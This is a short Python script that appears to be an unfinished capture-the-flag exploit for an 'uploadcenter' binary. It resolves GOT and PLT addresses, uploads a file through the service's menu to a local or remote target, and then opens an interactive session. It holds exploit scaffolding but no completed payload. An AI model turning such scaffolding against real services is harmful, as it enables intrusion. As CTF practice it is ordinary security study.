#!/usr/bin/env python
from sc_pwn import *

env = Environment('local', 'remote')
env.set_item('mode',    local = 'SOCKET', remote = 'SOCKET')
env.set_item('target',  local   = {'host':'192.168.92.129','port':8080}, \
                        remote  = {'host':'202.120.7.216','port':12345})
env.select('local')

binf = ELF('uploadcenter_5f1e953dffe476a418a93d2c9e40fbdc')
addr_plt_puts       = binf.plt('puts')
addr_got_main       = binf.got('__libc_start_main')
addr_bss            = binf.section('.bss')
#addr_main           = binf.function('main')

#==========
def attack(cmn):
    uc = UploadCenter(cmn)
    uc.upload('a.png')
    """
    cmn.read_until('Monitor File\n')
    cmn.sendln('2')

    raw_input('>>')
    cmn.send(pack_32(0x10))
    raw_input('>>')
    cmn.send('a'*0x10)
    """

class UploadCenter:
    def __init__(self, cmn):
        self.read_until = cmn.read_until
        self.read_all   = cmn.read_all
        self.sendln     = cmn.sendln
        self.send       = cmn.send

    def upload(self, fname):
        self.read_until('Monitor File\n')
        self.sendln('2')

        data = open(fname, 'rb').read()
        raw_input('>>')
        self.send(pack_32(len(data)))
        raw_input('>>')
        self.send(data)
        
#==========

if __name__=='__main__':
    cmn = Communicate(env.target, env.mode)
    attack(cmn)

    #sh = Shell(cmn)
    #sh.select()
    #del(sh)
    Interact(cmn).worker(False)
    
    del(cmn)
    
#==========
